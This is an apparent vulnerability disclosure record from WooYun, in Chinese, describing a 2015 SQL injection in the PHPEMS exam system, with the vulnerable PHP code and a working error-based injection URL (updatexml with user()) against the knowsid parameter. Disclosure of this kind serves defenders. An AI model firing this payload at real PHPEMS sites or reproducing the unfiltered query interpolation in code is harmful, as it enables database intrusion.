{"id": 36847, "wybug_id": "wooyun-2015-0100990", "wybug_title": "PHPEMS一处SQL注入漏洞", "wybug_corp": "PHPEMS", "wybug_author": "路人甲", "wybug_date": "2015-03-12 18:49", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： PHPEMS一处SQL注入漏洞 详细说明：  6.phpems某处存在SQL注入漏洞存在注入漏洞的代码位置是/app/exam/app.php的exercise()函数中具体代码在靠后的位置928行左右$questionids = $this->question->selectQuestionsByKnows($args['knowsid'],$args['number'],$dt);//SQL注入漏洞这里的参数$args['knowsid']回溯898行$args = $this->ev->get('args');可以从URL控制然后进入函数public function selectQuestionsByKnows($knowsid,$qt)\t{\t\t$knowsids = $knowsid;\t\tforeach($qt as $key => $t)\t\t{\t\t\t$par = 0;\t\t\tif(!$par)\t\t\t{\t\t\t\t$par++;\t\t\t\t$trand = rand(1,4);\t\t\t\tif($trand < 3)\t\t\t\t{\t\t\t\t\t$qrs = $this->getRandQuestionRowsList(array(\"quest2knows.qkknowsid IN ({$knowsids})\",\"questionrows.qrtype = '{$key}'\",\"questionrows.qrnumber <= '{$t}'\"));\t\t\t\t\tif(count($qrs))\t\t\t\t\t{\t\t\t\t\t\t$qrid = $qrs[array_rand($qrs,1)];\t\t\t\t\t\t$questionrow[$key][] = $qrid;\t\t\t\t\t\t$qr = $this->exam->getQuestionRowsByArgs(\"qrid = '{$qrid}'\");\t\t\t\t\t\t$t = intval($t - $qr['qrnumber']);\t\t\t\t\t}没有经过过滤，直接参与组成语句执行！验证之注册用户登录之访问如下链接localhost/ems/index.php?exam-app-exercise&setExecriseConfig=1&args[knowsid]=1,updatexml(1,user(),1)&args[number][1]=2\n\nOK！没有任何问题！值得一说的，在执行过程中，里面有个函数放了一个rand（1,4）只有返回结果大于3才能触发这个漏洞，所以如果一次没有触发，可以多次刷新验证，理论上，75%的首次刷出率，哈哈   漏洞证明：  注册用户登录之访问如下链接localhost/ems/index.php?exam-app-exercise&setExecriseConfig=1&args[knowsid]=1,updatexml(1,user(),1)&args[number][1]=2\n\nOK！没有任何问题！值得一说的，在执行过程中，里面有个函数放了一个rand（1,4）只有返回结果大于3才能触发这个漏洞，所以如果一次没有触发，可以多次刷新验证，理论上，75%的首次刷出率，哈哈   修复方案：  严格过滤参数吧   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}